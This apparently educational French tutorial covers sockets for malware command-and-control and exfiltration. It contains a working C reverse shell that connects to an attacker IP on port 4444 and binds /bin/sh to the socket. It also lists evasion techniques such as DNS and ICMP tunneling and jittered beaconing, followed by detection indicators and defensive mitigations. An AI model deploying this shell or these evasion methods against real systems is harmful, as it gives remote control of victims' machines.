# Networking & Sockets - Communication C2 et Exfiltration

Raw sockets, TCP/UDP, reverse shell avancé, DNS tunneling - fondamentaux pour Command & Control (C2), beaconing, exfiltration de données. Techniques utilisées par tous les malwares modernes pour maintenir communication avec l'attaquant.

⚠️ AVERTISSEMENT STRICT : Techniques de malware development avancées. Usage éducatif uniquement. Tests sur VM isolées. Usage malveillant = PRISON.

```c
// Reverse shell TCP classique
int sock = socket(AF_INET, SOCK_STREAM, 0);
struct sockaddr_in server = { .sin_family = AF_INET, .sin_port = htons(4444) };
inet_pton(AF_INET, "192.168.1.100", &server.sin_addr);
connect(sock, (struct sockaddr*)&server, sizeof(server));

// Redirection stdin/stdout/stderr vers socket
dup2(sock, 0); dup2(sock, 1); dup2(sock, 2);
execve("/bin/sh", NULL, NULL);
```

## Compilation

### Linux
```bash
gcc example.c -o net_client
gcc example.c -o net_server -DSERVER_MODE
```

### Windows
```bash
gcc example.c -o net_client.exe -lws2_32
gcc example.c -o net_server.exe -lws2_32 -DSERVER_MODE
```

## Concepts clés

- **Raw Sockets** : Manipulation directe paquets IP/ICMP pour covert channels
- **Reverse Shell** : Victime initie connexion vers attacker (bypass firewall)
- **Bind Shell** : Attaquant se connecte vers victime (rare, détecté)
- **HTTP/HTTPS C2** : Communication via requêtes HTTP (blend in web traffic)
- **DNS Tunneling** : Exfiltration via requêtes DNS TXT records
- **ICMP Tunneling** : Données cachées dans ping packets
- **Beaconing** : Check-in périodique avec jitter pour éviter détection pattern

## Techniques utilisées par

- **Cobalt Strike** : HTTP/HTTPS beacons, malleable C2 profiles, domain fronting
- **Metasploit** : Reverse TCP/HTTP/HTTPS stages, meterpreter communication
- **APT29 (Cozy Bear)** : DNS tunneling pour exfiltration, HTTP C2 via Cloudflare
- **APT28 (Fancy Bear)** : HTTPS C2 avec certificate pinning, beaconing aléatoire
- **Emotet** : HTTPS C2, rotation IPs, fallback domains

## Détection et Mitigation

**Indicateurs** :
- Connexions sortantes vers IPs/ports suspects (non-standard ports)
- Beaconing patterns réguliers détectés par SIEM
- DNS queries anormales (long TXT records, random subdomains)
- ICMP packets avec payload data (ping normal = empty)
- HTTP User-Agents suspects ou malformés

**Mitigations EDR/Firewall** :
- Firewall egress rules (whitelist sortant)
- DNS sinkholing pour C2 domains
- IDS/IPS signatures pour shellcode patterns
- SSL/TLS inspection (MITM proxy corporatif)
- Network behavioral analytics pour beaconing detection
